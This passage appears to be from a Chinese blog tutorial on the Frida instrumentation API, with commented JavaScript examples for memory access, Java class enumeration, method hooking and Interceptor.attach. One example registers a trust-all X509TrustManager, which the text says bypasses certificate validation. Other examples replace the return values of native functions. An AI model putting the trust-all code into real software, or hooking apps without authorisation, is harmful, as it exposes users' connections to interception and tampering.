<span class="hljs-comment">//定义需要写入的字节数组 这个字节数组是字符串&quot;roysue&quot;的十六进制</span><br>        <span class="hljs-keyword">var</span> arr = [ <span class="hljs-number">0x72</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x65</span>];<br>        <span class="hljs-comment">//申请一个新的内存空间 返回指针 大小是arr.length</span><br>        <span class="hljs-keyword">const</span> r = Memory.alloc(arr.length);<br>        <span class="hljs-comment">//将arr数组写入R地址中</span><br>        Memory.writeByteArray(r,arr);<br>        <span class="hljs-comment">//读取r指针，长度是arr.length 也就是会打印上面一样的值</span><br>        <span class="hljs-keyword">var</span> buffer = Memory.readByteArray(r, arr.length);<br>        <span class="hljs-comment">//输出</span><br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;Memory.readByteArray:&quot;</span>);<br>        <span class="hljs-built_in">console</span>.log(hexdump(buffer, &#123;<br>            <span class="hljs-attr">offset</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-attr">length</span>: arr.length,<br>            <span class="hljs-attr">header</span>: <span class="hljs-literal">true</span>,<br>            <span class="hljs-attr">ansi</span>: <span class="hljs-literal">false</span><br>        &#125;));<br>      &#125;);  <br>    &#125;);<br>&#125;<br>setImmediate(frida_Memory,<span class="hljs-number">0</span>);<br><br>输出如下。<br>[Google Pixel::com.roysue.roysueapplication]-&gt; Memory.readByteArray:<br>           <span class="hljs-number">0</span>  <span class="hljs-number">1</span>  <span class="hljs-number">2</span>  <span class="hljs-number">3</span>  <span class="hljs-number">4</span>  <span class="hljs-number">5</span>  <span class="hljs-number">6</span>  <span class="hljs-number">7</span>  <span class="hljs-number">8</span>  <span class="hljs-number">9</span>  A  B  C  D  E  F  0123456789ABCDEF<br><span class="hljs-number">00000000</span>  <span class="hljs-number">72</span> 6f <span class="hljs-number">79</span> <span class="hljs-number">73</span> <span class="hljs-number">75</span> <span class="hljs-number">65</span>                                roysue<br><br></code></pre></td></tr></table></figure><h3 id="Java对象"><a href="#Java对象" class="headerlink" title="Java对象"></a>Java对象</h3><h4 id="Java-available"><a href="#Java-available" class="headerlink" title="Java.available"></a>Java.available</h4><p>该函数一般用来判断当前进程是否加载了JavaVM，Dalvik或ART虚拟机</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">frida_Java</span>(<span class="hljs-params"></span>) </span>&#123;<br>    Java.perform(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-comment">//作为判断用</span><br>        <span class="hljs-keyword">if</span>(Java.available)<br>        &#123;<br>            <span class="hljs-comment">//注入的逻辑代码</span><br>            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;hello java vm&quot;</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-comment">//未能正常加载JAVA VM</span><br>            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;error&quot;</span>);<br>        &#125;<br>    &#125;);<br>&#125;       <br>setImmediate(frida_Java,<span class="hljs-number">0</span>);<br><br>输出如下。<br>hello java vm<br></code></pre></td></tr></table></figure><h4 id="Java-androidVersion"><a href="#Java-androidVersion" class="headerlink" title="Java.androidVersion"></a>Java.androidVersion</h4><p>显示android系统版本号</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">function</span> frida_Java() &#123;<br>    Java.<span class="hljs-keyword">perform</span>(<span class="hljs-keyword">function</span> () &#123;<br>        //作为判断用<br>        <span class="hljs-keyword">if</span>(Java.available)<br>        &#123;<br>            //注入的逻辑代码<br>            console.log(&quot;&quot;,Java.androidVersion);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            //未能正常加载JAVA VM<br>            console.log(&quot;error&quot;);<br>        &#125;<br>    &#125;);<br>&#125;       <br>setImmediate(frida_Java,<span class="hljs-number">0</span>);<br><br>输出如下。<br><span class="hljs-number">9</span><br>因为我的系统版本是<span class="hljs-number">9</span>版本~<br></code></pre></td></tr></table></figure><h4 id="枚举类Java-enumerateLoadedClasses"><a href="#枚举类Java-enumerateLoadedClasses" class="headerlink" title="枚举类Java.enumerateLoadedClasses"></a>枚举类Java.enumerateLoadedClasses</h4><p>该API枚举当前加载的所有类信息，它有一个回调函数分别是onMatch、onComplete函数，我们来看看代码示例以及效果！</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">function</span> frida_Java() &#123;<br>    Java.<span class="hljs-keyword">perform</span>(<span class="hljs-keyword">function</span> () &#123;<br>        <span class="hljs-keyword">if</span>(Java.available)<br>        &#123;<br>            //console.log(&quot;&quot;,Java.androidVersion);<br>            //枚举当前加载的所有类<br>            Java.enumerateLoadedClasses(&#123;<br>                //每一次回调此函数时其参数className就是类的信息<br>                onMatch: <span class="hljs-keyword">function</span> (className)<br>                &#123;<br>                    //输出类字符串<br>                    console.log(&quot;&quot;,className);<br>                &#125;,<br>                //枚举完毕所有类之后的回调函数<br>                onComplete: <span class="hljs-keyword">function</span> ()<br>                &#123;<br>                    //输出类字符串<br>                    console.log(&quot;输出完毕&quot;);<br>                &#125;<br>            &#125;);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            console.log(&quot;error&quot;);<br>        &#125;<br>    &#125;);<br>&#125;       <br>setImmediate(frida_Java,<span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><h4 id="枚举类加载器Java-enumerateLoadedClasses"><a href="#枚举类加载器Java-enumerateLoadedClasses" class="headerlink" title="枚举类加载器Java.enumerateLoadedClasses"></a>枚举类加载器Java.enumerateLoadedClasses</h4><p>该api枚举Java VM中存在的类加载器，其有一个回调函数，分别是onMatch: function (loader)与onComplete: function ()<br>它也有一个好兄弟叫Java.enumerateClassLoadersSync()也是返回的数组</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">frida_Java</span>(<span class="hljs-params"></span>) </span>&#123;<br>    Java.perform(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(Java.available)<br>        &#123;<br>            <span class="hljs-comment">//枚举当前加载的Java VM类加载器</span><br>            Java.enumerateClassLoaders(&#123;<br>                <span class="hljs-comment">//回调函数，参数loader是类加载的信息</span><br>                <span class="hljs-attr">onMatch</span>: <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">loader</span>)</span><br><span class="hljs-function">                </span>&#123;<br>                    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;&quot;</span>,loader);<br>                &#125;,<br>                <span class="hljs-comment">//枚举完毕所有类加载器之后的回调函数</span><br>                <span class="hljs-attr">onComplete</span>: <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>)</span><br><span class="hljs-function">                </span>&#123;<br>                    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;end&quot;</span>);<br>                &#125;<br>            &#125;);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;error&quot;</span>);<br>        &#125;<br>    &#125;);<br>&#125;       <br>setImmediate(frida_Java,<span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><h4 id="附加调用Java-perform"><a href="#附加调用Java-perform" class="headerlink" title="附加调用Java.perform"></a>附加调用Java.perform</h4><p>Java.perform（fn）主要用于当前线程附加到Java VM并且调用fn方法<br>它也有一个好兄弟。Java.performNow(fn)~</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">frida_Java</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-comment">//运行当前js脚本时会对当前线程附加到Java VM虚拟机，并且执行function方法</span><br>    Java.perform(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-comment">//判断是否Java VM正常运行</span><br>        <span class="hljs-keyword">if</span>(Java.available)<br>        &#123;<br>            <span class="hljs-comment">//如不意外会直接输出 hello</span><br>            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;hello&quot;</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;error&quot;</span>);<br>        &#125;<br>    &#125;);<br>&#125;       <br>setImmediate(frida_Java,<span class="hljs-number">0</span>);<br><br>输出如下。<br>[Google Pixel::com.roysue.roysueapplication]-&gt; hello<br></code></pre></td></tr></table></figure><h4 id="获取类Java-use"><a href="#获取类Java-use" class="headerlink" title="获取类Java.use"></a>获取类Java.use</h4><p>Java.use(className)，动态获取className的类定义，通过对其调用$new()来调用构造函数，可以从中实例化对象。当想要回收类时可以调用$Dispose()方法显式释放，当然也可以等待JavaScript的垃圾回收机制，当实例化一个对象之后，可以通过其实例对象调用类中的静态或非静态的方法，官方代码示例定义如下。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js">Java.perform(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>  <span class="hljs-comment">//获取android.app.Activity类</span><br>  <span class="hljs-keyword">var</span> Activity = Java.use(<span class="hljs-string">&#x27;android.app.Activity&#x27;</span>);<br>  <span class="hljs-comment">//获取java.lang.Exception类</span><br>  <span class="hljs-keyword">var</span> Exception = Java.use(<span class="hljs-string">&#x27;java.lang.Exception&#x27;</span>);<br>  <span class="hljs-comment">//拦截Activity类的onResume方法</span><br>  Activity.onResume.implementation = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-comment">//调用onResume方法的时候，会在此处被拦截并且调用以下代码抛出异常！</span><br>    <span class="hljs-keyword">throw</span> Exception.$new(<span class="hljs-string">&#x27;Oh noes!&#x27;</span>);<br>  &#125;;<br>&#125;);<br></code></pre></td></tr></table></figure><h4 id="扫描实例类Java-choose"><a href="#扫描实例类Java-choose" class="headerlink" title="扫描实例类Java.choose"></a>扫描实例类Java.choose</h4><p>在堆上查找实例化的对象，示例代码如下！</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs js">Java.perform(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-comment">//查找android.view.View类在堆上的实例化对象</span><br>    Java.choose(<span class="hljs-string">&quot;android.view.View&quot;</span>, &#123;<br>        <span class="hljs-comment">//枚举时调用</span><br>        <span class="hljs-attr">onMatch</span>:<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">instance</span>)</span>&#123;<br>            <span class="hljs-comment">//打印实例</span><br>            <span class="hljs-built_in">console</span>.log(instance);<br>        &#125;,<br>        <span class="hljs-comment">//枚举完成后调用</span><br>        <span class="hljs-attr">onComplete</span>:<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;end&quot;</span>)<br>        &#125;&#125;);<br>&#125;);<br><br>输出如下：<br>android.view.View&#123;<span class="hljs-number">2292774</span> V.ED..... ......ID <span class="hljs-number">0</span>,<span class="hljs-number">1794</span>-<span class="hljs-number">1080</span>,<span class="hljs-number">1920</span> #<span class="hljs-number">1020030</span> android:id/navigationBarBackground&#125;<br>android.view.View&#123;d43549d V.ED..... ......ID <span class="hljs-number">0</span>,<span class="hljs-number">0</span>-<span class="hljs-number">1080</span>,<span class="hljs-number">63</span> #102002f android:id/statusBarBackground&#125;<br>end<br></code></pre></td></tr></table></figure><h4 id="类型转换器Java-cast"><a href="#类型转换器Java-cast" class="headerlink" title="类型转换器Java.cast"></a>类型转换器Java.cast</h4><p>Java.cast(handle, klass)，就是将指定变量或者数据强制转换成你所有需要的类型；创建一个 JavaScript 包装器，给定从 Java.use（） 返回的给定类klas的句柄的现有实例。此类包装器还具有用于获取其类的包装器的类属性，以及用于获取其类名的字符串表示的$className属性，通常在拦截so层时会使用此函数将jstring、jarray等等转换之后查看其值。</p><h4 id="定义任意数组类型Java-array"><a href="#定义任意数组类型Java-array" class="headerlink" title="定义任意数组类型Java.array"></a>定义任意数组类型Java.array</h4><p>frida提供了在js代码中定义java数组的api，该数组可以用于传递给java API，代码示例如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js">Java.perform(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-comment">//定义一个int数组、值是1003, 1005, 1007</span><br>        <span class="hljs-keyword">var</span> intarr = Java.array(<span class="hljs-string">&#x27;int&#x27;</span>, [ <span class="hljs-number">1003</span>, <span class="hljs-number">1005</span>, <span class="hljs-number">1007</span> ]);<br>        <span class="hljs-comment">//定义一个byte数组、值是0x48, 0x65, 0x69</span><br>        <span class="hljs-keyword">var</span> bytearr = Java.array(<span class="hljs-string">&#x27;byte&#x27;</span>, [ <span class="hljs-number">0x48</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x69</span> ]);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i=<span class="hljs-number">0</span>;i&lt;bytearr.length;i++)<br>        &#123;<br>            <span class="hljs-comment">//输出每个byte元素</span><br>            <span class="hljs-built_in">console</span>.log(bytearr[i])<br>        &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><p>我们通过上面定义int数组和byte的例子可以知道其定义格式为Java.array(‘type’,[value1,value2,….]);那它都支持type呢?</p><p>|</p><table><thead><tr><th>索引</th><th>type</th><th>含义</th></tr></thead><tbody><tr><td>1</td><td>Z</td><td>boolean</td></tr><tr><td>2</td><td>B</td><td>byte</td></tr><tr><td>3</td><td>C</td><td>char</td></tr><tr><td>4</td><td>S</td><td>short</td></tr><tr><td>5</td><td>I</td><td>int</td></tr><tr><td>6</td><td>J</td><td>long</td></tr><tr><td>7</td><td>F</td><td>float</td></tr><tr><td>8</td><td>D</td><td>double</td></tr><tr><td>9</td><td>V</td><td>void</td></tr></tbody></table><h4 id="注册类Java-registerClass-spec"><a href="#注册类Java-registerClass-spec" class="headerlink" title="注册类Java.registerClass(spec)"></a>注册类Java.registerClass(spec)</h4><p>Java.registerClass：创建一个新的Java类并返回一个包装器，其中规范是一个包含：</p><p>name：指定类名称的字符串。</p><p>superClass：（可选）父类。要从 java.lang.Object 继承的省略。</p><p>implements：（可选）由此类实现的接口数组。</p><p>fields：（可选）对象，指定要公开的每个字段的名称和类型。</p><p>methods：（可选）对象，指定要实现的方法。</p><p>注册一个类，返回类的实例，实例化目标类对象并且调用类中的方法代码如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js">Java.perform(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>          <span class="hljs-comment">//注册一个目标进程中的类，返回的是一个类对象</span><br>          <span class="hljs-keyword">var</span> hellojni = Java.registerClass(&#123;<br>            <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;com.roysue.roysueapplication.hellojni&#x27;</span><br>          &#125;);<br>          <span class="hljs-built_in">console</span>.log(hellojni.addInt(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>));<br>&#125;);<br></code></pre></td></tr></table></figure><p>官方案例:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//获取目标进程的SomeBaseClass类</span><br><span class="hljs-keyword">var</span> SomeBaseClass = Java.use(<span class="hljs-string">&#x27;com.example.SomeBaseClass&#x27;</span>);<br><span class="hljs-comment">//获取目标进程的X509TrustManager类</span><br><span class="hljs-keyword">var</span> X509TrustManager = Java.use(<span class="hljs-string">&#x27;javax.net.ssl.X509TrustManager&#x27;</span>);<br><br><span class="hljs-keyword">var</span> MyWeirdTrustManager = Java.registerClass(&#123;<br>  <span class="hljs-comment">//注册一个类是进程中的MyWeirdTrustManager类</span><br>  <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;com.example.MyWeirdTrustManager&#x27;</span>,<br>  <span class="hljs-comment">//父类是SomeBaseClass类</span><br>  <span class="hljs-attr">superClass</span>: SomeBaseClass,<br>  <span class="hljs-comment">//实现了MyWeirdTrustManager接口类</span><br>  <span class="hljs-attr">implements</span>: [X509TrustManager],<br>  <span class="hljs-comment">//类中的属性</span><br>  <span class="hljs-attr">fields</span>: &#123;<br>    <span class="hljs-attr">description</span>: <span class="hljs-string">&#x27;java.lang.String&#x27;</span>,<br>    <span class="hljs-attr">limit</span>: <span class="hljs-string">&#x27;int&#x27;</span>,<br>  &#125;,<br>  <span class="hljs-comment">//定义的方法</span><br>  <span class="hljs-attr">methods</span>: &#123;<br>    <span class="hljs-comment">//类的构造函数</span><br>    <span class="hljs-attr">$init</span>: <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>      <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;Constructor called&#x27;</span>);<br>    &#125;,<br>    <span class="hljs-comment">//X509TrustManager接口中方法之一，该方法作用是检查客户端的证书</span><br>    <span class="hljs-attr">checkClientTrusted</span>: <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">chain, authType</span>) </span>&#123;<br>      <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;checkClientTrusted&#x27;</span>);<br>    &#125;,<br>    <span class="hljs-comment">//该方法检查服务器的证书，不信任时。在这里通过自己实现该方法，可以使之信任我们指定的任何证书。在实现该方法时，也可以简单的不做任何处理，即一个空的函数体，由于不会抛出异常，它就会信任任何证书。</span><br>    <span class="hljs-attr">checkServerTrusted</span>: [&#123;<br>      <span class="hljs-comment">//返回值类型</span><br>      <span class="hljs-attr">returnType</span>: <span class="hljs-string">&#x27;void&#x27;</span>,<br>      <span class="hljs-comment">//参数列表</span><br>      <span class="hljs-attr">argumentTypes</span>: [<span class="hljs-string">&#x27;[Ljava.security.cert.X509Certificate;&#x27;</span>, <span class="hljs-string">&#x27;java.lang.String&#x27;</span>],<br>      <span class="hljs-comment">//实现方法</span><br>      <span class="hljs-attr">implementation</span>: <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">chain, authType</span>) </span>&#123;<br>         <span class="hljs-comment">//输出</span><br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;checkServerTrusted A&#x27;</span>);<br>      &#125;<br>    &#125;, &#123;<br>      <span class="hljs-attr">returnType</span>: <span class="hljs-string">&#x27;java.util.List&#x27;</span>,<br>      <span class="hljs-attr">argumentTypes</span>: [<span class="hljs-string">&#x27;[Ljava.security.cert.X509Certificate;&#x27;</span>, <span class="hljs-string">&#x27;java.lang.String&#x27;</span>, <span class="hljs-string">&#x27;java.lang.String&#x27;</span>],<br>      <span class="hljs-attr">implementation</span>: <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">chain, authType, host</span>) </span>&#123;<br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;checkServerTrusted B&#x27;</span>);<br>        <span class="hljs-comment">//返回null会信任所有证书</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>      &#125;<br>    &#125;],<br>    <span class="hljs-comment">//　返回受信任的X509证书数组。</span><br>    <span class="hljs-attr">getAcceptedIssuers</span>: <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>      <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;getAcceptedIssuers&#x27;</span>);<br>      <span class="hljs-keyword">return</span> [];<br>    &#125;,<br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><p>主要实现了证书类的javax.net.ssl.X509TrustManager类，，这里就是相当于自己在目标进程中重新创建了一个类，实现了自己想要实现的类构造，重构造了其中的三个接口函数、从而绕过证书校验</p><h4 id="Java-vm对象"><a href="#Java-vm对象" class="headerlink" title="Java.vm对象"></a>Java.vm对象</h4><p>Java.vm对象十分常用，比如想要拿到JNI层的JNIEnv对象，可以使用getEnv()；</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">frida_Java</span>(<span class="hljs-params"></span>) </span>&#123;     <br>    Java.perform(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>         <span class="hljs-comment">//拦截getStr函数</span><br>         Interceptor.attach(Module.findExportByName(<span class="hljs-string">&quot;libhello.so&quot;</span> , <span class="hljs-string">&quot;Java_com_roysue_roysueapplication_hellojni_getStr&quot;</span>), &#123;<br>            <span class="hljs-attr">onEnter</span>: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">args</span>) </span>&#123;<br>                <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;getStr&quot;</span>);<br>            &#125;,<br>            <span class="hljs-attr">onLeave</span>:<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">retval</span>)</span>&#123;<br>                <span class="hljs-comment">//它的返回值的是retval 在jni层getStr的返回值的jstring </span><br>                <span class="hljs-comment">//我们在这里做的事情就是替换掉结果</span><br>                <span class="hljs-comment">//先获取一个Env对象</span><br>                <span class="hljs-keyword">var</span> env = Java.vm.getEnv();<br>                <span class="hljs-comment">//通过newStringUtf方法构建一个jstirng字符串</span><br>                <span class="hljs-keyword">var</span> jstring = env.newStringUtf(<span class="hljs-string">&#x27;roysue&#x27;</span>);<br>                <span class="hljs-comment">//replace替换掉结果</span><br>                retval.replace(jstring);<br>                <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;getSum方法返回值为:roysue&quot;</span>)<br>            &#125;<br>    &#125;);<br>&#125;<br>setImmediate(frida_Java,<span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><h3 id="Interceptor对象"><a href="#Interceptor对象" class="headerlink" title="Interceptor对象"></a>Interceptor对象</h3><p>该对象功能十分强大，函数原型是Interceptor.attach(target, callbacks):</p><p>参数target是需要拦截的位置的函数地址，也就是填某个so层函数的地址即可对其拦截</p><p>target是一个NativePointer参数，用来指定你想要拦截的函数的地址，NativePointer我们也学过是一个指针。</p><p>需要注意的是对于Thumb函数需要对函数地址+1，callbacks则是它的回调函数，分别是以下两个回调函数：</p><h4 id="Interceptor-attach"><a href="#Interceptor-attach" class="headerlink" title="Interceptor.attach"></a>Interceptor.attach</h4><p>onEnter：函数（args）：回调函数，给定一个参数args，可用于读取或写入参数作为 NativePointer 对象的数组。</p><p>onLeave：函数（retval）：回调函数给定一个参数 retval，该参数是包含原始返回值的 NativePointer 派生对象。可以调用 retval.replace（0） 以整数 0 替换返回值，或者调用 retval.replace（ptr（”0x1234”））以替换为指针。</p><p>请注意，此对象在 OnLeave调用中回收，因此不要将其存储在回调之外并使用它。如果需要存储包含的值，请制作深副本，例如：ptr（retval.toString（））。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//使用Module对象getExportByNameAPI直接获取libc.so中的导出函数read的地址，对read函数进行附加拦截</span><br>Interceptor.attach(Module.getExportByName(<span class="hljs-string">&#x27;libc.so&#x27;</span>, <span class="hljs-string">&#x27;read&#x27;</span>), &#123;<br>  <span class="hljs-comment">//每次read函数调用的时候会执行onEnter回调函数</span><br>  <span class="hljs-attr">onEnter</span>: <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">args</span>) </span>&#123;<br>    <span class="hljs-built_in">this</span>.fileDescriptor = args[<span class="hljs-number">0</span>].toInt32();<br>  &#125;,<br>  <span class="hljs-comment">//read函数执行完成之后会执行onLeave回调函数</span><br>  <span class="hljs-attr">onLeave</span>: <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">retval</span>) </span>&#123;<br>    <span class="hljs-keyword">if</span> (retval.toInt32() &gt; <span class="hljs-number">0</span>) &#123;<br>      <span class="hljs-comment">/* do something with 